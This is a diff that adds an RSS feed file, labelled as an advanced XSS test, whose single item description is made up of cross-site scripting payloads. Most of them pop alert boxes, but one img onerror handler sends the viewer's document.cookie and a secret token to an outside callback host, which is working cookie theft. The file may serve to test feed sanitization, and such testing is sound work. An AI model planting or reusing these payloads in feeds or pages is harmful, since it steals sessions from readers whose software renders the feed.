@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+  <channel>
+    <title>XSS Test Advanced</title>
+    <link>http://example.com</link>
+    <description>Advanced XSS bypasses</description>
+    <item>
+      <title>XSS-adv-1</title>
+      <link>http://example.com/1</link>
+      <description><![CDATA[<svg/onload=alert(1)><iframe srcdoc="<script>alert(2)</script>"></iframe><body onload=alert(3)><a href="javascript:alert(4)">click</a><img src="x" onerror="fetch('https://www.business-eco.ch/api/callbacks?secret=7e7b11838907cd01b77187ce9cc0299a&xss=fired&cookie='+document.cookie)"><svg><script>alert(5)</script></svg>]]></description>
+      <pubDate>Wed, 29 May 2026 18:00:00 GMT</pubDate>
+      <guid>xss-2</guid>
+    </item>
+  </channel>
+</rss>
